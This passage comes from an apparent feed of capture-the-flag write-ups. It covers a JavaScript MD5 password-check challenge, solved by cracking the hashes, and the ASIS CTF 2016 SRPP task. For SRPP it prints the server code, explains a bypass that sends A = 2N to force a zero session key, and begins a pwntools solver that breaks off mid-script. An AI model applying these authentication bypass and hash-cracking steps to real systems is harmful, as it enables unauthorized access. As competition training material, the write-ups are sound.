<span class="number">0x698098D8</span>);</div><div class="line">        d = FF(d, a, b, c, x[k + <span class="number">9</span>], S12, <span class="number">0x8B44F7AF</span>);</div><div class="line">        c = FF(c, d, a, b, x[k + <span class="number">10</span>], S13, <span class="number">0xFFFF5BB1</span>);</div><div class="line">        b = FF(b, c, d, a, x[k + <span class="number">11</span>], S14, <span class="number">0x895CD7BE</span>);</div><div class="line">        a = FF(a, b, c, d, x[k + <span class="number">12</span>], S11, <span class="number">0x6B901122</span>);</div><div class="line">        d = FF(d, a, b, c, x[k + <span class="number">13</span>], S12, <span class="number">0xFD987193</span>);</div><div class="line">        c = FF(c, d, a, b, x[k + <span class="number">14</span>], S13, <span class="number">0xA679438E</span>);</div><div class="line">        b = FF(b, c, d, a, x[k + <span class="number">15</span>], S14, <span class="number">0x49B40821</span>);</div><div class="line">        a = GG(a, b, c, d, x[k + <span class="number">1</span>], S21, <span class="number">0xF61E2562</span>);</div><div class="line">        d = GG(d, a, b, c, x[k + <span class="number">6</span>], S22, <span class="number">0xC040B340</span>);</div><div class="line">        c = GG(c, d, a, b, x[k + <span class="number">11</span>], S23, <span class="number">0x265E5A51</span>);</div><div class="line">        b = GG(b, c, d, a, x[k + <span class="number">0</span>], S24, <span class="number">0xE9B6C7AA</span>);</div><div class="line">        a = GG(a, b, c, d, x[k + <span class="number">5</span>], S21, <span class="number">0xD62F105D</span>);</div><div class="line">        d = GG(d, a, b, c, x[k + <span class="number">10</span>], S22, <span class="number">0x2441453</span>);</div><div class="line">        c = GG(c, d, a, b, x[k + <span class="number">15</span>], S23, <span class="number">0xD8A1E681</span>);</div><div class="line">        b = GG(b, c, d, a, x[k + <span class="number">4</span>], S24, <span class="number">0xE7D3FBC8</span>);</div><div class="line">        a = GG(a, b, c, d, x[k + <span class="number">9</span>], S21, <span class="number">0x21E1CDE6</span>);</div><div class="line">        d = GG(d, a, b, c, x[k + <span class="number">14</span>], S22, <span class="number">0xC33707D6</span>);</div><div class="line">        c = GG(c, d, a, b, x[k + <span class="number">3</span>], S23, <span class="number">0xF4D50D87</span>);</div><div class="line">        b = GG(b, c, d, a, x[k + <span class="number">8</span>], S24, <span class="number">0x455A14ED</span>);</div><div class="line">        a = GG(a, b, c, d, x[k + <span class="number">13</span>], S21, <span class="number">0xA9E3E905</span>);</div><div class="line">        d = GG(d, a, b, c, x[k + <span class="number">2</span>], S22, <span class="number">0xFCEFA3F8</span>);</div><div class="line">        c = GG(c, d, a, b, x[k + <span class="number">7</span>], S23, <span class="number">0x676F02D9</span>);</div><div class="line">        b = GG(b, c, d, a, x[k + <span class="number">12</span>], S24, <span class="number">0x8D2A4C8A</span>);</div><div class="line">        a = HH(a, b, c, d, x[k + <span class="number">5</span>], S31, <span class="number">0xFFFA3942</span>);</div><div class="line">        d = HH(d, a, b, c, x[k + <span class="number">8</span>], S32, <span class="number">0x8771F681</span>);</div><div class="line">        c = HH(c, d, a, b, x[k + <span class="number">11</span>], S33, <span class="number">0x6D9D6122</span>);</div><div class="line">        b = HH(b, c, d, a, x[k + <span class="number">14</span>], S34, <span class="number">0xFDE5380C</span>);</div><div class="line">        a = HH(a, b, c, d, x[k + <span class="number">1</span>], S31, <span class="number">0xA4BEEA44</span>);</div><div class="line">        d = HH(d, a, b, c, x[k + <span class="number">4</span>], S32, <span class="number">0x4BDECFA9</span>);</div><div class="line">        c = HH(c, d, a, b, x[k + <span class="number">7</span>], S33, <span class="number">0xF6BB4B60</span>);</div><div class="line">        b = HH(b, c, d, a, x[k + <span class="number">10</span>], S34, <span class="number">0xBEBFBC70</span>);</div><div class="line">        a = HH(a, b, c, d, x[k + <span class="number">13</span>], S31, <span class="number">0x289B7EC6</span>);</div><div class="line">        d = HH(d, a, b, c, x[k + <span class="number">0</span>], S32, <span class="number">0xEAA127FA</span>);</div><div class="line">        c = HH(c, d, a, b, x[k + <span class="number">3</span>], S33, <span class="number">0xD4EF3085</span>);</div><div class="line">        b = HH(b, c, d, a, x[k + <span class="number">6</span>], S34, <span class="number">0x4881D05</span>);</div><div class="line">        a = HH(a, b, c, d, x[k + <span class="number">9</span>], S31, <span class="number">0xD9D4D039</span>);</div><div class="line">        d = HH(d, a, b, c, x[k + <span class="number">12</span>], S32, <span class="number">0xE6DB99E5</span>);</div><div class="line">        c = HH(c, d, a, b, x[k + <span class="number">15</span>], S33, <span class="number">0x1FA27CF8</span>);</div><div class="line">        b = HH(b, c, d, a, x[k + <span class="number">2</span>], S34, <span class="number">0xC4AC5665</span>);</div><div class="line">        a = II(a, b, c, d, x[k + <span class="number">0</span>], S41, <span class="number">0xF4292244</span>);</div><div class="line">        d = II(d, a, b, c, x[k + <span class="number">7</span>], S42, <span class="number">0x432AFF97</span>);</div><div class="line">        c = II(c, d, a, b, x[k + <span class="number">14</span>], S43, <span class="number">0xAB9423A7</span>);</div><div class="line">        b = II(b, c, d, a, x[k + <span class="number">5</span>], S44, <span class="number">0xFC93A039</span>);</div><div class="line">        a = II(a, b, c, d, x[k + <span class="number">12</span>], S41, <span class="number">0x655B59C3</span>);</div><div class="line">        d = II(d, a, b, c, x[k + <span class="number">3</span>], S42, <span class="number">0x8F0CCC92</span>);</div><div class="line">        c = II(c, d, a, b, x[k + <span class="number">10</span>], S43, <span class="number">0xFFEFF47D</span>);</div><div class="line">        b = II(b, c, d, a, x[k + <span class="number">1</span>], S44, <span class="number">0x85845DD1</span>);</div><div class="line">        a = II(a, b, c, d, x[k + <span class="number">8</span>], S41, <span class="number">0x6FA87E4F</span>);</div><div class="line">        d = II(d, a, b, c, x[k + <span class="number">15</span>], S42, <span class="number">0xFE2CE6E0</span>);</div><div class="line">        c = II(c, d, a, b, x[k + <span class="number">6</span>], S43, <span class="number">0xA3014314</span>);</div><div class="line">        b = II(b, c, d, a, x[k + <span class="number">13</span>], S44, <span class="number">0x4E0811A1</span>);</div><div class="line">        a = II(a, b, c, d, x[k + <span class="number">4</span>], S41, <span class="number">0xF7537E82</span>);</div><div class="line">        d = II(d, a, b, c, x[k + <span class="number">11</span>], S42, <span class="number">0xBD3AF235</span>);</div><div class="line">        c = II(c, d, a, b, x[k + <span class="number">2</span>], S43, <span class="number">0x2AD7D2BB</span>);</div><div class="line">        b = II(b, c, d, a, x[k + <span class="number">9</span>], S44, <span class="number">0xEB86D391</span>);</div><div class="line">        a = AU(a, AA);</div><div class="line">        b = AU(b, BB);</div><div class="line">        c = AU(c, CC);</div><div class="line">        d = AU(d, DD);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> temp = WordToHex(a) + WordToHex(b) + WordToHex(c) + WordToHex(d);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> temp.toLowerCase();</div><div class="line">&#125;</div><div class="line">__seceret = <span class="string">'622b010e27e3f82d0f4e2e69a3785a395767c7a39599aea7114553448239eb41cab90bfecd4a8a0881d0a8128f27c483'</span>;</div><div class="line"><span class="keyword">var</span> _=__=___=<span class="string">''</span>;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; __seceret.length; i+=<span class="number">3</span>) &#123;</div><div class="line">   _+=__seceret[i+<span class="number">0</span>]; </div><div class="line">   __+=__seceret[i+<span class="number">1</span>];</div><div class="line">   ___+=__seceret[i+<span class="number">2</span>];</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> h = prompt(<span class="string">"Please enter your passowrd"</span>);</div><div class="line"><span class="keyword">if</span>(generate(h[<span class="number">11</span>]+h[<span class="number">8</span>]+h[<span class="number">1</span>]+h[<span class="number">0</span>]+h[<span class="number">9</span>]+h[<span class="number">4</span>]+h[<span class="number">13</span>]) == _ &amp;&amp; generate(h[<span class="number">15</span>]+h[<span class="number">10</span>]+h[<span class="number">3</span>]+h[<span class="number">5</span>]+h[<span class="number">6</span>]) ==__ &amp;&amp; generate(h[<span class="number">16</span>]+h[<span class="number">12</span>]+h[<span class="number">14</span>]+h[<span class="number">2</span>]+h[<span class="number">7</span>])==___)&#123;</div><div class="line">    alert(<span class="string">'your flag is Bugs_Bunny&#123;'</span>+h+<span class="string">'&#125;'</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    alert(<span class="string">'I\'m sorry my son it\' not easy'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>I’ve seen this before and realized this was almost the same challenge it happened in trend micro ctf about 1 year ago, which for coincidence did a write up for it! you can check it up here <a href="https://kinyabitch.wordpress.com/2016/07/31/ctf/" target="_blank" rel="external">https://kinyabitch.wordpress.com/2016/07/31/ctf/</a>.<br>Doing a fast analysis to the code we can see that the “generate function” is actually an known hash function which you could quickly find it by just searching it on google to identify it as md5 and find it in places like this <a href="https://gist.github.com/nduphuong/752463" target="_blank" rel="external">https://gist.github.com/nduphuong/752463</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">__seceret = <span class="string">'622b010e27e3f82d0f4e2e69a3785a395767c7a39599aea7114553448239eb41cab90bfecd4a8a0881d0a8128f27c483'</span>;</div><div class="line"><span class="keyword">var</span> _=__=___=<span class="string">''</span>;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; __seceret.length; i+=<span class="number">3</span>) &#123;</div><div class="line">   _+=__seceret[i+<span class="number">0</span>]; </div><div class="line">   __+=__seceret[i+<span class="number">1</span>];</div><div class="line">   ___+=__seceret[i+<span class="number">2</span>];</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> h = prompt(<span class="string">"Please enter your passowrd"</span>);</div><div class="line"><span class="keyword">if</span>(generate(h[<span class="number">11</span>]+h[<span class="number">8</span>]+h[<span class="number">1</span>]+h[<span class="number">0</span>]+h[<span class="number">9</span>]+h[<span class="number">4</span>]+h[<span class="number">13</span>]) == _ &amp;&amp; generate(h[<span class="number">15</span>]+h[<span class="number">10</span>]+h[<span class="number">3</span>]+h[<span class="number">5</span>]+h[<span class="number">6</span>]) ==__ &amp;&amp; generate(h[<span class="number">16</span>]+h[<span class="number">12</span>]+h[<span class="number">14</span>]+h[<span class="number">2</span>]+h[<span class="number">7</span>])==___)&#123;</div><div class="line">    alert(<span class="string">'your flag is Bugs_Bunny&#123;'</span>+h+<span class="string">'&#125;'</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    alert(<span class="string">'I\'m sorry my son it\' not easy'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Now analysing the rest of the code we can see that variable <strong>seceret is splited <b> into 3 variables “_”, “</b></strong>“ and “___”. If you ran this code on your browser you could easily find the values of these 3 variables instead of doing the calculations:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">_ = <span class="number">6</span>b07fd4ea837c39e1542e1bbca01a224 </div><div class="line">__ = <span class="number">20</span>ee80e63596799a1543bc9fd88d8878 </div><div class="line">___ = <span class="number">21232</span>f297a57a5a743894a0e4a801fc3</div></pre></td></tr></table></figure>
<p>This are obviously md5 hashes now cracking them(john the ripper, hashcat or even searching the hashes on google)  will get:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="number">6</span>b07fd4ea837c39e1542e1bbca01a224 -&gt; tunisia</div><div class="line"><span class="number">20</span>ee80e63596799a1543bc9fd88d8878 -&gt; bunny</div><div class="line"><span class="number">21232</span>f297a57a5a743894a0e4a801fc3 -&gt; admin</div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">if</span>(generate(h[<span class="number">11</span>]+h[<span class="number">8</span>]+h[<span class="number">1</span>]+h[<span class="number">0</span>]+h[<span class="number">9</span>]+h[<span class="number">4</span>]+h[<span class="number">13</span>]) == _ &amp;&amp; generate(h[<span class="number">15</span>]+h[<span class="number">10</span>]+h[<span class="number">3</span>]+h[<span class="number">5</span>]+h[<span class="number">6</span>]) ==__ &amp;&amp; generate(h[<span class="number">16</span>]+h[<span class="number">12</span>]+h[<span class="number">14</span>]+h[<span class="number">2</span>]+h[<span class="number">7</span>])==___)&#123;</div><div class="line">    alert(<span class="string">'your flag is Bugs_Bunny&#123;'</span>+h+<span class="string">'&#125;'</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    alert(<span class="string">'I\'m sorry my son it\' not easy'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Analysing the password verification we can see that the that instruction to be true we will need those strings concatenation be our cracked hashes:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">h[<span class="number">11</span>]+h[<span class="number">8</span>]+h[<span class="number">1</span>]+h[<span class="number">0</span>]+h[<span class="number">9</span>]+h[<span class="number">4</span>]+h[<span class="number">13</span>] = <span class="string">'t'</span>+<span class="string">'u'</span>+<span class="string">'n'</span>+<span class="string">'i'</span>+<span class="string">'s'</span>+<span class="string">'i'</span>+<span class="string">'a'</span>;</div><div class="line">h[<span class="number">15</span>]+h[<span class="number">10</span>]+h[<span class="number">3</span>]+h[<span class="number">5</span>]+h[<span class="number">6</span>] = <span class="string">'b'</span>+<span class="string">'u'</span>+<span class="string">'n'</span>+<span class="string">'n'</span>+<span class="string">'y'</span>;</div><div class="line">h[<span class="number">16</span>]+h[<span class="number">12</span>]+h[<span class="number">14</span>]+h[<span class="number">2</span>]+h[<span class="number">7</span>] = <span class="string">'a'</span>+<span class="string">'d'</span>+<span class="string">'m'</span>+<span class="string">'i'</span>+<span class="string">'n'</span>;</div></pre></td></tr></table></figure>
<p>Now reordering the string from the index 0 to 16 we get “inininynusutdamba”. We can conclude that is the password to be entered into the prompt, after submitting it the flag showed up at the webpage.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Web100&lt;br&gt;100&lt;br&gt;&lt;br&gt;My secure system is secure even you have my code&lt;br&gt;&lt;a href=&quot;http://52.53.151.123/web/web100.html&quot; targ
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="bruteforce" scheme="https://teamrocketist.github.io/tags/bruteforce/"/>
    
      <category term="md5" scheme="https://teamrocketist.github.io/tags/md5/"/>
    
  </entry>
  
  <entry>
    <title>[Crypto] ASIS CTF Finals 2016 - SRPP [Secure Remote Password Protocol]</title>
    <link href="https://teamrocketist.github.io/2016/09/14/Crypto-ASIS-CTF-Finals-2016-SRPP-Secure-Remote-Password-Protocol/"/>
    <id>https://teamrocketist.github.io/2016/09/14/Crypto-ASIS-CTF-Finals-2016-SRPP-Secure-Remote-Password-Protocol/</id>
    <published>2016-09-14T03:12:59.000Z</published>
    <updated>2017-08-10T02:59:35.385Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Average: 2.83<br>Rating Count: 12<br>You Rated: Not rated<br>Points<br>231<br>Solves<br>35<br>Category<br>Crypto<br><br>Description<br><br>    Try to crack our super safe cryptography system and find the flag.<br><br>    nc srpp.asis-ctf.ir 22778<br><br><a href="http://asis-ctf.ir/tasks/srpp.txz_baa9ec300fd3488a8417fc849a07c2aaf5a26224" target="_blank" rel="external">http://asis-ctf.ir/tasks/srpp.txz_baa9ec300fd3488a8417fc849a07c2aaf5a26224</a><br></blockquote>

<p>Server.py (given by the challenge)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"><span class="keyword">import</span> time </div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> thread <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> password, flag</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">_port = int(sys.argv[<span class="number">1</span>])</div><div class="line">_timeout = <span class="number">3</span> </div><div class="line">_host = <span class="string">''</span></div><div class="line">_bufsize = <span class="number">4096</span></div><div class="line"></div><div class="line">_logfile = open(str(sys.argv[<span class="number">0</span>]) + <span class="string">'.log'</span>, <span class="string">'a'</span>)</div><div class="line"></div><div class="line">_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">_socket.bind((_host, _port))</div><div class="line">_socket.listen(_bufsize)</div><div class="line">_taskname = <span class="string">'SRPP'</span></div><div class="line">_hash = <span class="string">'sha512'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hash</span><span class="params">(*args)</span>:</span></div><div class="line">    a = <span class="string">':'</span>.join(str(a) <span class="keyword">for</span> a <span class="keyword">in</span> args)</div><div class="line">    <span class="keyword">return</span> int(sha256(a).hexdigest(), <span class="number">16</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getParams</span><span class="params">(nbit)</span>:</span></div><div class="line">    N = getPrime(nbit)</div><div class="line">    g = <span class="number">2</span></div><div class="line">    k = Hash(N, g)</div><div class="line">    <span class="keyword">return</span>(N, g, k)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">clientThread</span><span class="params">(client)</span>:</span></div><div class="line">    client.send(<span class="string">'Bot detection: Are you ready?'</span> + <span class="string">'\n'</span>)</div><div class="line">    A = <span class="string">''</span>.join([choice(printable[:<span class="number">62</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">26</span>)])</div><div class="line">    <span class="keyword">print</span> A[:<span class="number">4</span>]</div><div class="line">    msg = <span class="string">'ASIS needs proof of work to start the '</span> + _taskname + <span class="string">' challenge.\n'</span> + _hash.upper() + <span class="string">'(X + "%s").hexdigest() = "%s...",\nX is an alphanumeric string and |X| = 4\nEnter X: '</span> % (A[<span class="number">4</span>:], sha512(A).hexdigest()[:<span class="number">32</span>])</div><div class="line">    client.send(msg)</div><div class="line">    X = client.recv(_bufsize).strip()</div><div class="line">    <span class="keyword">if</span> sha256(X + A[<span class="number">4</span>:]).hexdigest() == sha256(A).hexdigest():</div><div class="line">        client.settimeout(_timeout)</div><div class="line">        client.send(<span class="string">'Good work, Let\'s Go!'</span> + <span class="string">'\n'</span>)</div><div class="line">        nbit = <span class="number">1024</span></div><div class="line">        params = getParams(nbit)</div><div class="line">        N, g, k = params</div><div class="line">        email = <span class="string">'admin@asis-ctf.ir'</span></div><div class="line">        client.send(<span class="string">'Please login as "admin@asis-ctf.ir" and get the flag:'</span> + <span class="string">'\n'</span>)</div><div class="line">        client.send(<span class="string">'Sever is generating the parameters ...'</span> + <span class="string">'\n'</span>)</div><div class="line">        client.send(<span class="string">'params = (N, g, k) = '</span> + str(params) + <span class="string">'\n'</span>)</div><div class="line">        </div><div class="line">        salt = urandom(<span class="number">32</span>)</div><div class="line">        </div><div class="line">        N, g, _ = params</div><div class="line">        x = Hash(salt, email, password)</div><div class="line">        verifier = pow(g, x, N)</div><div class="line">                </div><div class="line">    	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                client.send(<span class="string">'Send the email address and the public random positive value A seperated by "," as "email, A": '</span> + <span class="string">'\n'</span>)</div><div class="line">                ans = client.recv(_bufsize).strip()</div><div class="line">                <span class="keyword">print</span> ans</div><div class="line">                <span class="keyword">try</span>:</div><div class="line">                    email, A = ans.split(<span class="string">','</span>)</div><div class="line">                    A = int(A)</div><div class="line">                    <span class="keyword">assert</span> (A != <span class="number">0</span> <span class="keyword">and</span> A != N), client.send(<span class="string">'Are you kidding me?! :P'</span> + <span class="string">'\n'</span>)</div><div class="line">                    <span class="keyword">assert</span> email == <span class="string">'admin@asis-ctf.ir'</span>, client.send(<span class="string">'You should login as admin@asis-ctf.ir'</span> + <span class="string">'\n'</span>)</div><div class="line">                    b = getRandomRange(<span class="number">1</span>, N)</div><div class="line">                    B = (k * verifier + pow(g, b, N)) % N</div><div class="line">                </div><div class="line">                    client.send(<span class="string">'(salt,  public_ephemeral) = (%s, %d) \n'</span> % (salt.encode(<span class="string">'base64'</span>)[:<span class="number">-1</span>], B))</div><div class="line">                    <span class="keyword">print</span> gmpy.invert(B)</div><div class="line">                    u = Hash(A, B)</div><div class="line">                                        </div><div class="line">                    client.send(<span class="string">'Send the session key: '</span> + <span class="string">'\n'</span>)</div><div class="line">                    K_client = client.recv(_bufsize).strip()                    </div><div class="line">                    <span class="keyword">assert</span> K_client.isdigit(), client.send(<span class="string">'Please send a valid positive integer as session key.'</span> + <span class="string">'\n'</span>)</div><div class="line">                    K_client = int(K_client)</div><div class="line">                    </div><div class="line">                    S_s = pow(A * pow(verifier, u, N), b, N)</div><div class="line">                    K_server = Hash(S_s)        </div><div class="line">                    </div><div class="line">                    client.send(<span class="string">'Send a POC of session key: '</span> + <span class="string">'\n'</span>)</div><div class="line">                    M_client = client.recv(_bufsize).strip()</div><div class="line">                    </div><div class="line">                    </div><div class="line">                    <span class="keyword">assert</span> M_client.isdigit(), client.send(<span class="string">'Please send valid positive integer as POC.'</span> + <span class="string">'\n'</span>)</div><div class="line">                    M_client = int(M_client)</div><div class="line">                    </div><div class="line">                    <span class="keyword">assert</span> (K_server == K_client), client.send(<span class="string">'The session key is not correct!'</span> + <span class="string">'\n'</span>)    </div><div class="line">                    <span class="keyword">assert</span> (M_client == Hash(Hash(N) ^ Hash(g), Hash(email), salt, A, B, K_client)), client.send(<span class="string">'The POC is not correct!'</span> + <span class="string">'\n'</span>)</div><div class="line">                   </div><div class="line">                    M_server = Hash(A, M_client, K_server) <span class="comment"># <span class="doctag">TODO:</span> check server POC in clinet side</span></div><div class="line"></div><div class="line">                    client.send(<span class="string">'Great, you got the flag: '</span> + flag + <span class="string">'\n'</span>)</div><div class="line">                    client.close()</div><div class="line">                    <span class="keyword">break</span></div><div class="line">                                        </div><div class="line">                <span class="keyword">except</span>:</div><div class="line">                    client.send(<span class="string">'Provided input is not valid.'</span> + <span class="string">'\n'</span>)</div><div class="line">                    client.send(<span class="string">'Quiting ...'</span> + <span class="string">'\n'</span>)</div><div class="line">                    client.close()</div><div class="line">                    <span class="keyword">break</span></div><div class="line"> </div><div class="line">            <span class="keyword">except</span> socket.timeout:</div><div class="line">                client.send(<span class="string">'Timeout! Plase send faster ... \n'</span>)</div><div class="line">                client.close()</div><div class="line">                <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        client.send(<span class="string">'Sorry, Bad proof of work! \n'</span>)</div><div class="line">        client.close()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    client, addr = _socket.accept()</div><div class="line">    start_new_thread(clientThread ,(client,))</div><div class="line">s.close()</div></pre></td></tr></table></figure>
<p>To solve this you needed to realise that A = 2N ≡ 0 (mod N). The web server was checking only for values like A = 0 or A = N. To beat the system you only need to set the A to A = 2N and set the session key to 0 and hash it:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</div><div class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</div><div class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hash</span><span class="params">(*args)</span>:</span></div><div class="line">    a = <span class="string">':'</span>.join(str(a) <span class="keyword">for</span> a <span class="keyword">in</span> args)</div><div class="line">    <span class="keyword">return</span> int(sha256(a).hexdigest(), <span class="number">16</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_solution</span><span class="params">(s, sol)</span>:</span></div><div class="line">    <span class="keyword">return</span> sol == sha512(s).hexdigest()[:<span class="number">32</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="comment">#m = re.search('\"[a-zA-Z0-9]*\"', s)</span></div><div class="line">    m = re.findall(<span class="string">r'\"[a-zA-Z0-9.]*\"'</span>, s)</div><div class="line">    salt = m[<span class="number">0</span>][<span class="number">1</span>:<span class="number">-1</span>]</div><div class="line">    first16bytes = m[<span class="number">1</span>][<span class="number">1</span>:<span class="number">-4</span>]</div><div class="line">    <span class="keyword">return</span> salt, first16bytes</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">regex_parse</span><span class="params">(regex, s)</span>:</span></div><div class="line">    m = re.findall(regex, s)</div><div class="line">    <span class="keyword">return</span> m</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bot_system</span><span class="params">(junk)</span>:</span></div><div 